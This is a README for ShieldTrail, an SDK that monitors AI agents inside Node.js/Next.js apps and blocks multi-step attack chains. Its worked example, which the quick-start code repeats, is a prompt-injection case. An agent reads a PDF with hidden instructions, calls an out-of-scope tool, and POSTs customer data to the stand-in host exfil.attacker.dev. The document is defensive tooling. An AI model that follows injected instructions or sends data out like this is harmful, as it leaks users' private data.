<p align="center">
  <img src="apps/web/public/favicon.svg" width="64" height="64" alt="" />
</p>

<h1 align="center">ShieldTrail</h1>

<p align="center">
  <b>See the whole attack chain, not just the alert.</b><br />
  Attack Chain Intelligence and a shadow-first Security Autopilot for AI agents in Node.js / Next.js apps.
</p>

<p align="center">
  <a href="https://sergemiro.github.io/ShieldTrail/en/demo/"><b>Live demo</b></a> ·
  <a href="https://sergemiro.github.io/ShieldTrail/">Website (EN / FR)</a> ·
  <a href="https://sergemiro.github.io/ShieldTrail/en/start/">Get started</a> ·
  <a href="https://sergemiro.github.io/ShieldTrail/en/dashboard/">Dashboard</a> ·
  <a href="docs/PLAN.md">Plan & tests</a>
</p>

---

An agent reads a PDF with hidden instructions, calls an MCP tool its task never needed, then POSTs
customer data to a domain nobody has seen. In most stacks those are three unrelated log lines.
ShieldTrail sits **inside your app**, keeps per-trace state, and judges the fourth step in the light
of the first:

```
1. GET cdn.partner-files.io — First request to cdn.partner-files.io → ShieldTrail: ALERT (unknown-domain)
2. Prompt injection in https://cdn.partner-files.io/invoice-4521.pdf → ShieldTrail: ALERT (injection-seen)
3. Unexpected tool db.query — not in the task scope (tickets.read, tickets.reply) → ShieldTrail: ALERT
4. POST exfil.attacker.dev — Prompt injection → outbound request to an unknown domain → ShieldTrail: BLOCK
```

The request in step 4 never leaves the process; the reply to the customer still goes out. Every
step is saved as a graph you can open in the dashboard.

## Why another tool?

[Pipelock](https://github.com/pipelab-org/pipelock) already guards agent egress at the network
boundary, and [Invariant](https://github.com/invariantlabs-ai/invariant) checks agent traces against
rules. ShieldTrail does not compete with either. It covers what you only see from **inside the
application**:

| | Egress firewall (Pipelock) | Trace rules (Invariant) | **ShieldTrail** |
|---|---|---|---|
| Runs | proxy at the boundary | on agent traces | in-process SDK |
| Joins agent steps with the app's HTTP, errors, events | — | agent trace only | **yes, per trace** |
| Attack-chain graph for humans | — | — | **React Flow dashboard** |
| Shadow mode + per-rule enforce | partial | — | **built in** |
| Replay recorded chains before a release | — | offline analysis | **CLI with exit code** |
| Sees non-instrumented processes | yes | — | no: pair it with a proxy |

## Install

> Inside this repository the CLI is `npm run shieldtrail -- <command>` (works right after
> `npm install`, as soon as `npm run build` has run). Once installed as a package it is `npx shieldtrail`.

Not on the npm registry yet. Until then, build it from this repo:

```bash
git clone https://github.com/SergeMiro/ShieldTrail.git && cd ShieldTrail && npm install && npm run build
npm install /path/to/ShieldTrail/packages/shieldtrail   # in your app; core has zero runtime deps
npm install pg                    # optional, for PostgresStore
npm install @opentelemetry/api    # optional, to reuse OTel trace ids / export spans
```

## Quick start

```ts
import { createGuard, Baseline, GuardBlockedError } from 'shieldtrail';

const baseline = new Baseline();                 // Security Autopilot: learns normal
const guard = createGuard({
  mode: 'shadow',                                // record "would_block", stop nothing
  allowedDomains: ['api.acme.com', '*.openai.com'],
  observers: [baseline.observe],
});

const trace = guard.startTrace({
  agent: 'support-bot',
  task: 'Answer ticket #4521',
  allowedTools: ['tickets.read', 'tickets.reply'],
});

await trace.context({ source: attachmentUrl, text: pdfText });       // untrusted input
const rows = await trace.tool('db.query', args, () => db.query(args)); // any tool call
try {
  await trace.fetch('https://exfil.attacker.dev', { method: 'POST', body: JSON.stringify(rows) });
} catch (err) {
  if (err instanceof GuardBlockedError) console.log(err.decision); // enforce mode only
}

const chain = await trace.chain();   // nodes, edges (sequence / taint / data), severity, narrative
```

### MCP

```ts
import { guardMcpClient } from 'shieldtrail';

const mcp = guardMcpClient(client, trace, { server: 'helpdesk' }); // official MCP SDK Client
await mcp.listTools();   // a changed tool description later → drift.tool_definition_changed
await mcp.callTool({ name: 'db.query', arguments: { sql } });     // goes through the policy
```

### Next.js route handler

```ts
import { trace as otel } from '@opentelemetry/api';
import { collectorExporter, createGuard, GuardBlockedError } from 'shieldtrail';

const guard = createGuard({ mode: 'enforce', otel, exporters: [collectorExporter(process.env.SHIELDTRAIL_COLLECTOR!)] });

export async function POST(req: Request) {
  const t = guard.startTrace({ agent: 'copilot', task: 'chat' });
  try {
    return Response.json(await runAgent(await req.json(), t));
  } catch (err) {
    if (err instanceof GuardBlockedError) return Response.json({ blocked: err.decision }, { status: 403 });
    await t.error(err);
    throw err;
  }
}
```

## How it works

```
Node.js / Next.js app
  └─ shieldtrail SDK            trace.context · trace.tool · trace.fetch · trace.error · guardMcpClient
       │
       ├─ Attack Chain Intelligence   taint from untrusted input → every later step
       │                              sensitive data in tool results → outbound bodies
       ├─ Security Autopilot          policy engine (off / shadow / enforce, per-rule override)
       │                              baseline drift: new tool, new domain, tool definition, rate, errors
       ├─ store                       MemoryStore | PostgresStore   (secrets redacted before storage)
       ├─ exporters                   webhook · SIEM (CEF / ECS) · OpenTelemetry spans · collector
       └─ collector (node:http) ───▶ Dashboard (Next.js + React Flow)
```

**Event kinds:** `task`, `context`, `tool_call`, `http`, `error`, `app`.
**Labels:** `untrusted`, `injection`, `sensitive`, `tainted`, `egress`, `unexpected_tool`, `drift`.
**Decisions:** `allow`, `alert`, `would_block` (shadow), `block` (enforce).

### Default rules

| Rule | Matches | Action |
|---|---|---|
| `exfil-after-injection` | `http` with `tainted` + `egress` | block |
| `secret-egress` | `http` with `sensitive` + `egress` | block |
| `tool-after-injection` | `tool_call` with `tainted` + `unexpected_tool` | alert (turn into block once `allowedTools` is tuned) |
| `unknown-domain` | `http` with `egress` | alert |
| `unexpected-tool` | `tool_call` with `unexpected_tool` | alert |
| `injection-seen` | `context` with `injection` | alert |

Rules are plain data. First match wins, so put `allow` exceptions first. Any rule can carry its own
`mode`, which is how you enforce one rule while the rest stays in shadow:

```ts
createGuard({
  mode: 'shadow',
  rules: [
    { id: 'trusted-partner', match: { kind: 'http', target: 'https://api.partner.io/*' }, action: 'allow' },
    ...defaultRules.map((r) => (r.id === 'exfil-after-injection' ? { ...r, mode: 'enforce' } : r)),
  ],
});
```

## Shadow first, then enforce

1. **Observe** with `mode: 'shadow'`. Nothing is stopped; decisions are recorded as `would_block`.
2. **Review** `npm run shieldtrail -- report events.jsonl` (or `/v1/report` on the collector).
3. **Enforce** only the rules you trust, with a per-rule `mode: 'enforce'`.
4. **Replay before release:** re-run recorded chains through the next policy. Exit code 1 means the
   new policy would stop traffic that was allowed when recorded.

```bash
npm run shieldtrail -- replay events.jsonl --policy policy.next.json
# 2 events replayed, 1 decisions changed
#   + STOP  http https://api.partner.io/invoices  (alert → block, rule no-unknown-egress)
```

## Collector and dashboard

```bash
npm run shieldtrail -- collector --port 4319                        # in-memory
npm run shieldtrail -- collector --pg postgres://user:pass@host/db   # PostgreSQL
npm run shieldtrail -- collector --token "$SHIELDTRAIL_TOKEN"         # bearer auth on every request
npm run shieldtrail -- collector --allow-origin https://soc.acme.com # let another dashboard origin read it
```

Endpoints: `POST /v1/events`, `GET /v1/chains`, `GET /v1/chains/:id`, `GET /v1/report`,
`GET /v1/health`. It binds to `127.0.0.1`. Browsers can only read it from the hosted dashboard and
`http://localhost:3000` unless `--allow-origin` adds more, so a web page you happen to visit cannot
read your traces. POSTs must be JSON, every event is shape-checked and redacted before storage, and
`--token` turns on bearer auth. Events that arrive without a decision (from other services) are
analysed on arrival.

Open the dashboard with your collector:
`https://sergemiro.github.io/ShieldTrail/en/dashboard/?api=http://127.0.0.1:4319`

## SIEM and OpenTelemetry

```ts
import { otelExporter, siemExporter, webhookExporter } from 'shieldtrail';
import { trace } from '@opentelemetry/api';

createGuard({
  exporters: [
    siemExporter({ format: 'cef', send: (line) => syslog.send(line) }), // or 'ecs' for Elastic
    webhookExporter({ url: 'https://hooks.example.com/shieldtrail' }),
    otelExporter(trace.getTracer('shieldtrail')),
  ],
});
```

## Try the demo locally

```bash
git clone https://github.com/SergeMiro/ShieldTrail.git && cd ShieldTrail && npm install
npm run demo -- --mode off       # without ShieldTrail: the cards leak
npm run demo -- --mode shadow    # leaks, but the report says "would block"
npm run demo -- --mode enforce   # blocked, chain saved, app keeps working
```

## Development

```bash
npm test                 # vitest: SDK, real MCP SDK integration, collector over HTTP, demo scenario
SHIELDTRAIL_PG_URL=postgres://postgres:pw@127.0.0.1:5432/postgres npm test   # + PostgresStore
npm run typecheck
npm run dev -w shieldtrail-web          # site locally: http://localhost:3000/ShieldTrail/en/
npm run build:web && npm run test:web   # static EN/FR site + Playwright smoke test (local Chrome)
npm run deploy:pages                    # publish the site to gh-pages
```

Layout: `packages/shieldtrail` (SDK), `apps/web` (site, demo, dashboard), `examples/agent-demo`
(scenario shared by the CLI demo and the browser demo), `docs/PLAN.md` (plan of work and tests).

## Limits

- It sees what goes through the SDK. Watching every process and socket needs a proxy or a sensor.
- Injection detection is heuristic (normalised text, zero-width characters, base64). It raises the
  cost of an attack; it does not prove content is safe. Plug an LLM in through the `analyst` hook if
  you want a second opinion on a chain.
- `MemoryStore` is unbounded and meant for demos and tests. Use `PostgresStore` in production.

## License

MIT
